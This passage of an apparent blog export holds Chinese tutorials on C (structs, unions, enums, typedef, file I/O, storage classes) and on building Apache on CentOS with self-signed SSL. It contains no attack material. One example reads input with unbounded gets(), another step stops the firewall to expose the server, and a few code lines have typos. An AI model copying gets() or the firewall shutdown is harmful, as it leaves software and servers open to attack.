list is noe full"); break; &#125; puts("Enter next movie title(empty line to quit)"); &#125; //显示 if(ListIsEmpty(&amp;movies)) printf("No data entered. "); else &#123; printf("Here is the movie list:\n"); Traverse(&amp;movies, showmovies); &#125; printf("You entered %d movies.\n", ListItemCount(&amp;movies)); //清除 EmptyTheList(&amp;movies); printf("Bye!\n"); return 0;&#125;void showmovies(Item item)&#123; printf("Movie: %s Rating: %d\n", item.title, item.rating);&#125; 程序运行： 1234567891011121314151617181920Enter first movie title:aaaaEnter your rating &lt;0-10&gt;8Enter next movie title(empty line to quit)bbbbEnter your rating &lt;0-10&gt;9Enter next movie title(empty line to quit)ccccEnter your rating &lt;0-10&gt;7Enter next movie title(empty line to quit)Here is the movie list:Movie: aaaa Rating: 8Movie: bbbb Rating: 9Movie: cccc Rating: 7You entered 3 movies.Bye!]]></content>
      <categories>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Apache配置ssl证书-实现https访问]]></title>
    <url>%2F2020%2F03%2F31%2FApache%E9%85%8D%E7%BD%AEssl%E8%AF%81%E4%B9%A6-%E5%AE%9E%E7%8E%B0https%E8%AE%BF%E9%97%AE%2F</url>
    <content type="text"><![CDATA[HTTPS （全称：Hyper Text Transfer Protocol over SecureSocket Layer），是以安全为目标的 HTTP 通道，在HTTP的基础上通过传输加密和身份认证保证了传输过程的安全性 。HTTPS 在HTTP 的基础下加入SSL 层，HTTPS 的安全基础是 SSL，因此加密的详细内容就需要 SSL。 HTTPS 存在不同于 HTTP 的默认端口及一个加密/身份验证层（在 HTTP与 TCP 之间）。这个系统提供了身份验证与加密通讯方法。它被广泛用于万维网上安全敏感的通讯，例如交易支付等方面 。 安装Openssl生成ssl证书，需要用到openssl 12yum install openssl-devel -yyum update openssl 重新编译apache&emsp;&emsp;配置https，需要用到两个模块mod_socache_shmcb.so和mod_ssl.so，但由于我的apache是源码编译而成的，编译时没有生成mod_ssl.so模块，所以需要重新编译；其实mod_ssl.so可以用过动态方式编译安装，但是稍微有点复杂，所以建议备份网站，重新编译。模块路径（../apache/modules/） 12进入httpd源码目录 ./configure --prefix=/usr/local/apache --with-apr=/usr/local/apr --with-apr-util=/usr/local/apr-util --with-pcre=/usr/local/pcre --enable-ssl --enable-so 修改配置文件打开httpd.conf配置文件分别找到以下三条指令加载模块(删除#) 123LoadModule socache_shmcb_module modules/mod_socache_shmcb.soLoadModule ssl_module modules/mod_ssl.soInclude conf/extra/httpd-ssl.conf #引入外部的ssl配置文件 修改外部配置文件打开apache目录下conf/extra/httpd-ssl.conf文件 12345ServerName www.xxx.com:443 # 域名ServerAdmin xxx@xxx.com # 管理员邮箱SSLCertificateFile &quot;/usr/local/apache/conf/server.crt&quot; # 证书文件SSLCertificateKeyFile &quot;/usr/local/apache/conf/server.key&quot; #私钥文件 ssl证书1、创建密钥生成一个RSA私钥 1openssl genrsa -out server.key 2048 2、生成CSR（证书签名请求）说明：需要依次输入国家，地区，城市，组织，组织单位，Common Name和Email。其中Common Name，可以写自己的名字或者域名，如果要支持https，Common Name应该与域名保持一致，否则会引起浏览器警告。可以将证书发送给证书颁发机构（CA），CA验证过请求者的身份之后，会出具签名证书，需要花钱。另外，如果只是内部或者测试需求，也可以使用OpenSSL实现自签名。 1openssl req -new -key server.key -out server.csr 3、生成自签名证书内部或者测试使用，只要忽略证书提醒就可以了。 1openssl x509 -req -days 3650 -in server.csr -signkey server.key -out server.crt http重定向https配置httpd.conf加载 1LoadModule rewrite_module modules/mod_rewrite.so 在文本结尾添加 123RewriteEngine on RewriteCond %&#123;SERVER_PORT&#125; !^443$ RewriteRule ^.*$ https://%&#123;SERVER_NAME&#125;%&#123;REQUEST_URI&#125; [L,R] 配置成功后访问http时会自动跳转到https页面。]]></content>
      <categories>
        <category>Apache</category>
      </categories>
      <tags>
        <tag>Apache</tag>
        <tag>CentOS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[奇特的声明]]></title>
    <url>%2F2020%2F03%2F23%2F%E5%A5%87%E7%89%B9%E7%9A%84%E5%A3%B0%E6%98%8E%2F</url>
    <content type="text"><![CDATA[C允许您创建精心定制的数据形式。虽然我们坚持使用较简单的形式，但是我们觉得应该指出这些可能性。当进行一个声明可以添加一个或多个修饰符来修饰名称（或标识符）。 声明时可以使用的修饰符 修饰符 含义 * 表示一个指针 () 表示一个函数 [] 表示一个数组 C允许同时使用多于1个的修饰符，如下 12345678int board[8][8]; // int数组的数组int ** ptr; // 指向int的指针的指针int * risks[10]; // 具有10个元素的数组，每个元素时一个指向int的指针int (* rusks)[10]; // 一个指针，指向具有10个元素的数组int * oof[3][4]; // 一个3×4的数组，每个元素时一个指向int的指针int (* uuf)[3][4]; // 一个指针， 指向一个3×4的数组int (* uof[3])[4]; // 一个具有3个元素的数组，每个元素时一个指向 // 具有4个元素的int数组指针 修饰符的优先级：[]和()具有相同优先级且比&#10034;优先级高，顺序从左到右。圆括号可以使修饰符*具有更高优先级如： 1int (* uuf)[3][4]; // 一个指针， 指向一个3×4的数组 这些规则同时也产生下面的类型： 123char * fump(); // 返回char的指针的函数char (* frump)(); // 指向返回类型为char的函数的指针char (* flump[3])(); // 由3个指针组成的数组，每个指针指向返回类型为char的函数 使用typedef建立一系列相关类型 123456typedef int arr5[5];typedef arr5 * p_arr5;typedef p_arr5 arr10[10];arr5 togs; // togs是具有5个元素的int数组p_arr5 p2; // p2是一个指针， 指向具有5个元素的int数组arrp10 ap; // ap是具有10个元素的指针数组，每个指针指向具有5个元素的int数组]]></content>
      <categories>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CentOS7源码安装apache2.4]]></title>
    <url>%2F2020%2F03%2F19%2FCentOS7%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85apache2-4%2F</url>
    <content type="text"><![CDATA[Apache HTTP Server（简称Apache）是Apache软件基金会的一个开放源码的网页服务器，可以在大多数计算机操作系统中运行，由于其多平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩展，将Perl/Python等解释器编译到服务器中。 简介&emsp;&emsp;Apache 的安装无外乎两种方式：源代码安装和二进制包安装。这两种安装类型各有特色，二进制包安装不需要编译，而源代码安装则需要先配置编译再安装，二进制包安装在一个固定的位置下，选择固定的模块，而源代码安装则可以让你选择安装路径，选择你想要的模块。本次介绍源代码安装。 准备工作安装apache前需要准备安装源码以及相关依赖包(以下大多为当前最新版本) 1234567gccgcc-c++httpd-2.4.41.tar.gz （apache程序）apr-1.7.0.tar.gzapr-util-1.6.1.tar.gzexpat_2.0.1.orig.tar.gzpcre-8.44.tar.gz 下载文件链接： 12345[root@CentOS upload]# wget https://mirror.bit.edu.cn/apache//httpd/httpd-2.4.41.tar.gz[root@CentOS upload]# wget https://mirrors.tuna.tsinghua.edu.cn/apache//apr/apr-1.7.0.tar.gz[root@CentOS upload]# wget https://mirrors.tuna.tsinghua.edu.cn/apache//apr/apr-util-1.6.1.tar.gz[root@CentOS upload]# wget http://ftp.sjtu.edu.cn/ubuntu/pool/main/e/expat/expat_2.0.1.orig.tar.gz[root@CentOS upload]# wget http://ftp.pcre.org/pub/pcre/pcre-8.44.tar.gz 安装编译器12yum -y install gccyum -y install gcc-c++ gcc-c++是为了编译pcre 安装依赖包[root@CentOS upload]# for tar in *.tar.gz; do tar -xvf $tar; done # 一次性解压 安装apr123[root@CentOS upload]# cd apr-1.7.0/[root@CentOS apr-1.7.0]# ./configure --prefix=/usr/local/apr[root@CentOS apr-1.7.0]# make &amp;&amp; make install #编译，安装 –prefix= 安装路径 安装expat123[root@CentOS upload]# cd expat-2.0.1/[root@CentOS expat-2.0.1]# ./configure --prefix=/usr/local/expat[root@CentOS expat-2.0.1]# make &amp;&amp; make install 安装 apr-utilApr-util 依赖于两个模块apr和expat 123[root@CentOS upload]# cd apr-util-1.6.1/[root@CentOS apr-util-1.6.1]# ./configure --prefix=/usr/local/apr-util --with-apr=/usr/local/apr --with-expat=/usr/local/expat[root@CentOS apr-util-1.6.1]# make &amp;&amp; make install –with-xx = /usr/local/xx 指定依赖模块 安装 pcre123[root@CentOS upload]# cd pcre-8.44/[root@CentOS pcre-8.44]# ./configure --prefix=/usr/local/pcre[root@CentOS pcre-8.44]# make &amp;&amp; make install 安装apacheapache 依赖3个模块apr, apr-util, pcre; 123[root@CentOS upload]# cd httpd-2.4.41/[root@CentOS httpd-2.4.41]# ./configure --prefix=/usr/local/apache --with-apr=/usr/local/apr --with-apr-util=/usr/local/apr-util --with-pcre=/usr/local/pcre[root@CentOS httpd-2.4.41]# make &amp;&amp; make install 安装完后注意：要修改配置文件http.conf文件位置/usr/local/apache/conf/http.conf删掉ServerName www.example.com:80一行的注释符# 启动运行apache启动程序在安装目录的bin文件中 1[root@CentOS bin]# ./apachectl start 本地测试12[root@CentOS bin]# curl localhost&lt;html&gt;&lt;body&gt;&lt;h1&gt;It works!&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; 看到It works!说明apache成功运行 访问测试要让其他人访问站点，可以关掉防火墙关闭防火墙：[root@CentOS bin]# systemctl stop firewalld.service 本机ip：192.168.0.107访问测试成功]]></content>
      <categories>
        <category>Apache</category>
      </categories>
      <tags>
        <tag>Apache</tag>
        <tag>CentOS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C语言中的结构和其他数据类型]]></title>
    <url>%2F2020%2F03%2F18%2F%E7%BB%93%E6%9E%84%E5%92%8C%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[设计程序最重要的一个步骤就是选择一个表示数据的好方法。使用简单的变量和数组时远远不够的，C使用结构变量（structure variable）进一步增强了表示数据的能力。接下来将介绍c语言中的数据类型结构体，联合以及枚举。 结构结构体的声明先看下面一个例子： 12345678#define LEN 20struct book &#123; char title[LEN]; char author[LEN]; float value;&#125;; // 一个结构模板struct book library; // library 是一个以book结构设计的变量 &emsp;&emsp;以上声明描述了一个有两个字符数组和float变量组成的结构。struct是关键词， 后面跟的是一个可选标记（单词book），最后以分号结尾。描述完结构，就可以以此结构模板声明变量，如：”struct book library;” 声明了一个以book结构设计的变量–libraty。&emsp;&emsp;简略的声明方法： 123456#define LEN 20struct &#123; char title[LEN]; char author[LEN]; float value;&#125; library; 结构体的初始化结构体的一般初始化的方法 12345struct book library &#123; "gali", "yy", 9.15&#125;; (C99)运用点（.）运算符初始化,点运算符可以用来访问结构体成员只初始化成员value 1struct book test&#123; .vlaue = 10.99&#125;; 任意顺序指定初始化 12345struct book temp&#123; .value = 9.15, .author = "galiyy", .title = "test"&#125; 结构数组声明一个结构数组与其他类型数组类似 1struct book library[100]; 访问数组元素的成员 123library[0].value /* 第1个数组元素的value成员*/library[10].author /* 第11个数组元素的author成员*/library[5].title[3] /* title成员的第4个字符*/ 嵌套结构在一个结构体嵌套另一个结构体 123456789101112131415161718192021struct names &#123; //第一个结构 char first[LEN]; char last[LEN];&#125;;struct guy &#123; // 嵌套结构 struct names handle; // 在内部声明一个结构变量 char favfood[LEN]; char job[LEN]; float income;&#125;;int main(void)&#123; struct guy fellow = &#123; // 嵌套结构的初始化 &#123;"Ewen", "Villard"&#125;, "grilled salmon", "personall coach", 58112.00 &#125;; return 0;&#125; 访问嵌套结构中的成员 1printf("Hello! %s\n", fellow.handle.first); 指向结构的指针声明和初始化 12345678910111213141516struct guy fellow[2] = &#123; // 声明包含2个元素的结构数组 &#123; &#123;"Ewen", "Villard"&#125;, "grilled salmon", "personality coach", 58112.00 &#125;, &#123; &#123;"Rodney", "Swillbelly"&#125;, "tripe", "tabloid editor", 232400.00 &#125;&#125;;struct guy * him; // 声明一个指向guy结构的指针him = &amp;fellow[0]; // fellow[0]是一个结构体 这里值得注意一下，与数组不同，一个结构体的名字不是该结构体的地址，需要用&amp;取址运算符。 用指针访问成员 12345him = &amp;fellow[0]; // him指向fellow[0]him -&gt; income;him -&gt; name.first;him++; // him指向下一个结构fellow[1]fellow[1].income == (*him).income; 函数与结构体直接通过代码理解 1234567891011121314151617181920212223242526272829303132333435363738/* book.c -- 仅包含一本书的图书目录 */#include &lt;stdio.h&gt;#define MAXTITL 41 /* 书名的最大长度+1 */#define MAXAUTL 31 /* 作者名的最大长度+1 */struct book&#123; /* 结构模板：标记为book */ char title[MAXTITL]; char author[MAXAUTL]; float value;&#125;;struct book getbook(void); /* 返回一个结构体*/void showbook(const struct book *); /* 传入结构体的指针 */int main(void)&#123; struct book library; /* 把library声明为book类型的变量*/ struct book * pb; /* 指向book结构的指针*/ pb = &amp;library; /* pb指向了library */ library = getbook(); showbook(pb); return 0;&#125;struct book getbook(void)&#123; struct book temp; printf("Please enter the book title.\n"); gets(temp.title); printf("Now enter the author.\n"); gets(temp.author); printf("Now enter the value.\n"); scanf("%f", &amp;temp.value); return temp; /* 返回结构体 */&#125;void showbook(const struct book * pb) /* 传入结构体的指针 */&#123; printf("%s by %s, $%.2f.\n", pb-&gt;title, pb-&gt;author, pb-&gt;value);&#125; 结构体的特性数组与数组之间不能相互赋值，但是结构体可以C允许把一个结构体赋值给另一个结构体以上代码为例 123456struct book library;struct book library2;library2 = library;printf("library address :%p\n", &amp;library);printf("library2 address :%p \n", &amp;library2); 得出的结果 12library address :0061FED0library2 address :0061FE84 二者存储的位置不同，属于深拷贝。 联合&emsp;&emsp;联合（union）是一个能在同一个存储空间里（但不同时）存储不同类型的数据的数据类型。在结构中，各成员都占有自己的内存空间，它们是同时存在的。一个结构变量的总长度等于所有成员长度之和。在联合中，所有成员不能同时占用它的内存空间，它们不能同时存在。联合变量的长度等于最长的成员的长度。&emsp;&emsp;结构变量可以作为函数参数，函数也可返回指向结构的指针变量。而联合变量不能作为函数参数，函数也不能返回指向联合的指针变量。但可以使用指向联合变量的指针，也可使用联合数组。带标记的联合模板 12345union hold &#123; int digit; double bigfl; char letter;&#125; 声明变量3个hold变量 123union hold fit; /* hold类型的联合变量*/union hold save[10]; /* 10个联合变量的数组 */union hold * pu; /* 指向hold类型变量的指针 */ 初始化变量 12345union hold valA;valA.letter = 'A';union hold valB = valA; /* 把一个联合初始化为另一个联合*/union hold valC = &#123;88&#125;; /* 初始化联合的digit成员*/union hold valD = &#123;.bigfl = 118.2&#125;; /* 指定初始化项目 */ 下面是如何让使用联合（.）或（-&gt;）： 12345fit.digit = 23; /* 把23存储在fit, 使用2个字节 */fit.bigfl = 2.0; /* 清除23, 存储2.0, 使用8个字节 */fit.letter = &apos;h&apos;; /* 清除2.0, 存储&apos;h&apos;, 使用1个字节 */pu = &amp;fit;x = fit-&gt;digit; /* 指针访问 */ 枚举&emsp;&emsp;枚举类型（enumerated type）可以声明代表整数常量的符号名称。通过使用enum,可以创建一个新“类型”并指定它可以具有的值（实际上，enum常量是int类型）。枚举的目的是为了提高程序的可读性，它的语法与结构类似。 声明以下是枚举变量的声明： 1enum 枚举名 &#123;枚举元素1,枚举元素2,……&#125;; 如： 12enum spectrum &#123;red, orange, yellow, green, violet, blue&#125;;enum spectrum color; spectrum为标记名，color是一个变量,花括号里的内容red,orange… 实际都是int类型的常量{0, 1, 2,…}, 默认值时，它会被指定为0, 1, 2等常量指定值时, 1enum levels &#123;low = 10, medium = 500, high = 1000&#125;; 如果只对一个常量赋值,而后面为赋值时, 1enum feline &#123;cat, lynx = 10, puma, tiger&#125; 那么cat为0, 而lynx, puma, tiger 为10,11,12。 示例12345678910111213#include &lt;stdio.h&gt; enum DAY&#123; MON=1, TUE, WED, THU, FRI, SAT, SUN&#125;; int main()&#123; enum DAY day; day = WED; printf("%d",day); return 0;&#125; typedef&emsp;&emsp;typedef是在计算机编程语言中用来为复杂的声明定义简单的别名，它与宏定义有些差异。它本身是一种存储类的关键字，与auto、extern、mutable、static、register等关键字不能出现在同一个表达式中。它与define相似，但它们有3个不同： 与define不同，typedef给出的符号名称仅限于对类型，而不是对值。 typedef的解释由编译器，而不是预处理器执行。 虽然它的范围有限，但在其受限范围内，typedef比#define更灵活。 以下示例将展示它的用法：定义变量类型： 12typedef unsigned char BYTE; /* BYTE是unsigned char 类型 */BYTE x, y[10], * z; 这里BYTE大小写均可,大写可以方便区分。指针的应用 12typedef char * STRING;STRING name, sign; STRING name相当于 char * name;结构体中的应用 123456typedef struct node&#123; int x; int y;&#125;NODE, *pNODE;NODE node; // NODE 代替了struct node pNODE pn; // PNODE 代替了struct node * 这里注意node不是类型，必须配合struct一起使用；它只是一个临时标签可有可无。]]></content>
      <categories>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件I/O操作-常用库函数]]></title>
    <url>%2F2020%2F03%2F09%2F%E6%96%87%E4%BB%B6I-O%E6%93%8D%E4%BD%9C-%E5%B8%B8%E7%94%A8%E5%BA%93%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[介绍常用文件I/O操作的函数：fopen(), getc(), putc(), fclose(), fprintf(), fscanf(), fgets(), fputs(), rewind(), fseek(), ftell(), fflush(), ungetc(), setvbuf(), fgetpos(), fsetpos(), feof(), ferror(), fread(), fwrite() I/O级别&emsp;&emsp;I/O级别一般分为低级I/O (low-level I/O)和标准高级I/O (standard high-level I/O)。 低级I/O使用操作系统提供的基本I/O服务；标准高级I/O使用一个标准的C库函数包和stdio.h头文件的定义。因为无法保证所有操作系统都使用相同的低级I/O模型，所以ANSI C只支持标准I/O模型，保证程序的可移植性。 标准文件&emsp;&emsp;C程序运行后，会自动打开3个文件。这3个文件被称为标准输入(standard input)，标准输出(standard output)，标准错误输出(standard error output)。默认输入设备是键盘， 输出设备就是显示器。 标准文件指针 标准文件 文件指针 一般使用设备 标准输入 stdin 键盘 标准输出 stdout 显示器 标准错误 stderr 显示器 &emsp;&emsp;这些都是FILE指针类型，所以可用备用做标准I/O函数的参数。 库函数fopen()描述C 库函数 FILE *fopen(const char *filename, const char *mode) 使用给定的模式 mode 打开 filename 所指向的文件。 声明1FILE *fopen(const char *filename, const char *mode) 参数 filename – 这是 C 字符串，包含了要打开的文件名称。 mode – mode – 这是 C 字符串，包含了文件访问模式。 模式字符串 意义 “r” 打开一个用于读取的文件。该文件必须存在。 “w” 创建一个用于写入的空文件。如果文件名称与已存在的文件相同，则会删除已有文件的内容，文件被视为一个新的空文件。 “a” 追加到一个文件。写操作向文件末尾追加数据。如果文件不存在，则创建文件。 “r+” 打开一个用于更新的文件，可读取也可写入。该文件必须存在。 “w+” 创建一个用于读写的空文件。 “a+” 打开一个用于读取和追加的文件。 “rb”,”wb”,”ab”,”ab+”,”a+b”,”wb+”,”w+b”,”ab+”,”a+b” 与前面模式相似，只是使用二进制模式打开文件 注： 对于Unix和linux只有一种文件类型，带b和不带b的模式是相同的。 返回值该函数返回一个 FILE 指针。否则返回 NULL。 fclose()描述C 库函数 int fclose(FILE *stream) 关闭流 stream。刷新所有的缓冲区。 声明1int fclose(FILE *stream) 参数 stream – 这是指向 FILE 对象的指针，该 FILE 对象指定了要被关闭的流。 返回值如果流成功关闭，则该方法返回零。如果失败，则返回 EOF。 getc()描述C 库函数 int getc(FILE *stream) 从指定的流 stream 获取下一个字符（一个无符号字符），并把位置标识符往前移动。 声明1int getc(FILE *stream) 参数 stream – 这是指向 FILE 对象的指针，该 FILE 对象标识了要在上面执行操作的流。 返回值该函数以无符号 char 强制转换为 int 的形式返回读取的字符，如果到达文件末尾或发生读错误，则返回 EOF。 putc()描述C 库函数 int putc(int char, FILE *stream) 把参数 char 指定的字符（一个无符号字符）写入到指定的流 stream 中，并把位置标识符往前移动。 声明1int putc(int char, FILE *stream) 参数 char – 这是要被写入的字符。该字符以其对应的 int 值进行传递。 stream – 这是指向 FILE 对象的指针，该 FILE 对象标识了要被写入字符的流。 返回值该函数以无符号 char 强制转换为 int 的形式返回写入的字符，如果发生错误则返回 EOF。 fprintf()描述C 库函数 int fprintf(FILE *stream, const char *format, …) 发送格式化输出到流 stream 中。 声明1int fprintf(FILE *stream, const char *format, ...) 参数 stream – 这是指向 FILE 对象的指针，该 FILE 对象标识了流。 format – 这是 C 字符串，包含了要被写入到流 stream 中的文本。它可以包含嵌入的 format 标签，format 标签可被随后的附加参数中指定的值替换，并按需求进行格式化。 返回值如果成功，则返回写入的字符总数，否则返回一个负数。 fscanf()描述C 库函数 int fscanf(FILE *stream, const char *format, …) 从流 stream 读取格式化输入。 声明1int fscanf(FILE *stream, const char *format, ...) 参数 stream – 这是指向 FILE 对象的指针，该 FILE 对象标识了流。 format – 这是 C 字符串，包含了以下各项中的一个或多个：空格字符、非空格字符 和 format 说明符。 返回值如果成功，该函数返回成功匹配和赋值的个数。如果到达文件末尾或发生读错误，则返回 EOF。 fgets()描述C 库函数 char *fgets(char *str, int n, FILE *stream) 从指定的流 stream 读取一行，并把它存储在 str 所指向的字符串内。当读取 (n-1) 个字符时，或者读取到换行符时，或者到达文件末尾时，它会停止，具体视情况而定。 声明1char *fgets(char *str, int n, FILE *stream) 参数 str – 这是指向一个字符数组的指针，该数组存储了要读取的字符串。 n – 这是要读取的最大字符数（包括最后的空字符）。通常是使用以 str 传递的数组长度。 stream – 这是指向 FILE 对象的指针，该 FILE 对象标识了要从中读取字符的流。 返回值如果成功，该函数返回相同的 str 参数。如果到达文件末尾或者没有读取到任何字符，str 的内容保持不变，并返回一个空指针。如果发生错误，返回一个空指针。 fputs()描述C 库函数 int fputs(const char *str, FILE *stream) 把字符串写入到指定的流 stream 中，但不包括空字符。 声明1int fputs(const char *str, FILE *stream) 参数 str – 这是一个数组，包含了要写入的以空字符终止的字符序列。 stream – 这是指向 FILE 对象的指针，该 FILE 对象标识了要被写入字符串的流。 返回值该函数返回一个非负值，如果发生错误则返回 EOF。 rewind()描述C 库函数 void rewind(FILE *stream) 设置文件位置为给定流 stream 的文件的开头。 声明1void rewind(FILE *stream) 参数 stream – stream – 这是指向 FILE 对象的指针，该 FILE 对象标识了流。 fseek()描述C 库函数 int fseek(FILE *stream, long int offset, int whence) 设置流 stream 的文件位置为给定的偏移 offset，参数 offset 意味着从给定的 whence 位置查找的字节数。 声明1int fseek(FILE *stream, long int offset, int whence) 参数 stream – 这是指向 FILE 对象的指针，该 FILE 对象标识了流。 offset – 这是相对 whence 的偏移量，以字节为单位。 whence – 这是表示开始添加偏移 offset 的位置。它一般指定为下列常量之一： 常量 偏移量的起始点 SEEK_SET 文件开始 SEEK_CUR 当前位置 SEEK_END 文件结尾 返回值如果成功，则该函数返回零，否则返回非零值。 ftell()描述C 库函数 long int ftell(FILE *stream) 返回给定流 stream 的当前文件位置。 声明1long int ftell(FILE *stream) 参数 stream – 这是指向 FILE 对象的指针，该 FILE 对象标识了流。返回值该函数返回位置标识符的当前值。如果发生错误，则返回 -1L，全局变量 errno 被设置为一个正值。 fflush()描述C 库函数 int fflush(FILE *stream) 将缓冲区中任何未写的数据发送到stream指向的文件。如果是stream是空指针，将刷新掉所有的输出缓冲。 声明1int fflush(FILE *stream) 参数 stream – 这是指向 FILE 对象的指针，该 FILE 对象指定了一个缓冲流。返回值如果成功，该函数返回零值。如果发生错误，则返回 EOF，且设置错误标识符（即 feof）。 ungetc()描述C 库函数 int ungetc(int char, FILE *stream) 把字符 char（一个无符号字符）推入到指定的流 stream 中，以便它是下一个被读取到的字符。 声明1int ungetc(int char, FILE *stream) 参数 char – 这是要被推入的字符。该字符以其对应的 int 值进行传递。 stream – 这是指向 FILE 对象的指针，该 FILE 对象标识了输入流。返回值如果成功，则返回被推入的字符，否则返回 EOF，且流 stream 保持不变。 setvbuf()描述C 库函数 int setvbuf(FILE *stream, char *buffer, int mode, size_t size) 定义流 stream 应如何缓冲。（即为stream创建一个大小为size，模式为mode的替换缓冲区buffer） 声明1int setvbuf(FILE *stream, char *buffer, int mode, size_t size) 参数 stream – 这是指向 FILE 对象的指针，该 FILE 对象标识了一个打开的流。 buffer – 这是分配给用户的缓冲。如果设置为 NULL，该函数会自动分配一个指定大小的缓冲。 mode – 这指定了文件缓冲的模式，如下： size –这是缓冲的大小，以字节为单位。 模式 意义 _IOFBF 全缓冲：对于输出，数据在缓冲填满时被一次性写入。对于输入，缓冲会在请求输入且缓冲为空时被填充。 _IOLBF 行缓冲：对于输出，数据在遇到换行符或者在缓冲填满时被写入，具体视情况而定。对于输入，缓冲会在请求输入且缓冲为空时被填充，直到遇到下一个换行符。 _IONBF 无缓冲：不使用缓冲。每个 I/O 操作都被即时写入。buffer 和 size 参数被忽略。 返回值如果成功，则该函数返回 0，否则返回非零值。 fgetpos()描述C 库函数 int fgetpos(FILE *stream, fpos_t *pos) 获取流 stream 的当前文件位置，并把它写入到 pos。 声明1int fgetpos(FILE *stream, fpos_t *pos) 参数 stream – 这是指向 FILE 对象的指针，该 FILE 对象标识了流。 pos – 这是指向 fpos_t 对象的指针。 返回值如果成功，该函数返回零。如果发生错误，则返回非零值。 fsetpos()描述C 库函数 int fsetpos(FILE *stream, const fpos_t *pos) 设置给定流 stream 的文件位置为给定的位置。参数 pos 是由函数 fgetpos 给定的位置。 声明1int fsetpos(FILE *stream, const fpos_t *pos) 参数 stream – 这是指向 FILE 对象的指针，该 FILE 对象标识了流。 pos – 这是指向 fpos_t 对象的指针，该对象包含了之前通过 fgetpos 获得的位置。 返回值如果成功，该函数返回零值，否则返回非零值，并设置全局变量 errno 为一个正值，该值可通过 perror 来解释。 feof()描述C 库函数 int feof(FILE *stream) 测试给定流 stream 的文件结束标识符。 声明1int feof(FILE *stream) 参数 stream – 这是指向 FILE 对象的指针，该 FILE 对象标识了流。 返回值当设置了与流关联的文件结束标识符时，该函数返回一个非零值，否则返回零。 ferror()描述C 库函数 int ferror(FILE *stream) 测试给定流 stream 的错误标识符。 声明1int ferror(FILE *stream) 参数 stream – 这是指向 FILE 对象的指针，该 FILE 对象标识了流。 返回值如果设置了与流关联的错误标识符，该函数返回一个非零值，否则返回一个零值。 fread()描述C 库函数 size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream) 从给定流 stream 读取数据到 ptr 所指向的数组中。 声明1size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream) 参数 ptr – 这是指向带有最小尺寸 size*nmemb 字节的内存块的指针（数组）。 size – 这是要读取的每个元素的大小，以字节为单位。 nmemb – 这是元素的个数，每个元素的大小为 size 字节。 stream – 这是指向 FILE 对象的指针，该 FILE 对象指定了一个输入流。 返回值成功读取的元素总数会以 size_t 对象返回（正常与nmemb相等），size_t 对象是一个整型数据类型。如果总数与 nmemb 参数不同，则可能发生了一个错误或者到达了文件末尾。 fwrite()描述C 库函数 size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream) 把 ptr 所指向的数组中的数据写入到给定流 stream 中。 声明1size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream) 参数 ptr – 这是指向要被写入的元素数组的指针。 size – 这是要被写入的每个元素的大小，以字节为单位。 nmemb – 这是元素的个数，每个元素的大小为 size 字节。 stream – 这是指向 FILE 对象的指针，该 FILE 对象指定了一个输入流。 返回值如果成功，该函数返回一个 size_t 对象，表示元素的总数，该对象是一个整型数据类型。如果该数字与 nmemb 参数不同，则会显示一个错误。]]></content>
      <categories>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[存储类、链接和内存管理]]></title>
    <url>%2F2020%2F02%2F27%2F%E5%AD%98%E5%82%A8%E7%B1%BB%E3%80%81%E9%93%BE%E6%8E%A5%E5%92%8C%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%2F</url>
    <content type="text"><![CDATA[C的强大功能之一在于允许您控制程序的细节， C的内存管理正是这种控制能力的例子， 它通过让您决定知道哪些变量以及一个变量在程序中存在多长时间来实现控制。 简而言之， 就是变量的作用域（ 多大范围内可知） 和生存期（ 存在多长时间 ）。 存储类、链接&emsp;&emsp;C为变量提供了5种不同的存储模型，或称存储类。可以按照一个变量（更一般地，一个数据对象）的存储时期（storage duration）描述它，也可以按照它的作用域（scope）以及它的链接（linkage）来描述它。存储时期就是变量在内存中保留的时间，变量的作用域和链接一起表明程序的哪些部分可以通过变量名来使用该变量。&emsp;&emsp;不同的存储类提供了变量的作用域、链接和存储时期不停的组合。如下： 存储类 时期 作用域 链接 声明方式 自动 自动 代码块 空 代码块内，可以使用关键字auto 寄存器 自动 代码块 空 代码块内，使用关键字register 外部链接的静态 静态 文件 外部 所有函数之外 内部链接的静态 静态 文件 内部 所有函数之外，使用关键字static 空连接的静态 静态 代码块 空 代码块内，使用关键字static 作用域&emsp;&emsp;作用域可以是代码作用域、函数原型作用域，或者文件作用域。代码作用域：可以理解为一个代码块的范围，就是花括号包围的范围。 123456int test(int a)&#123; int b; ... return b;&#125; 代码中的a、b都有直到结束花括号的代码块作用域。在C99中把代码块的概念扩大了，如for循环、while循环或者if语句中即使没有使用花括号，这些语句中的变量也属于代码块作用域。 12345678910111213int test(int a)&#123; int b; int i; for(i = 0; i &lt; 10; i++&gt;) &#123; double q; //q的开始作用域 ... q += i; // q的结束作用域 &#125; ... return b;&#125; &emsp;&emsp;函数原型作用域，变量的作用域一直到声明结尾 12int test(int a, double b);void vla_test(int n, int m, ar[n][m]); // 可变长数组声明 &emsp;&emsp;文件作用域，变量在整个文件中都是可见的。 123456#include &lt;stdio.h&gt;int count = 0; // 具有文件作用域int main()&#123; ...&#125; 链接&emsp;&emsp;一个C变量具有下列链接：外部链接（external linkage）， 内部链接（internal linkage），或空链接（no 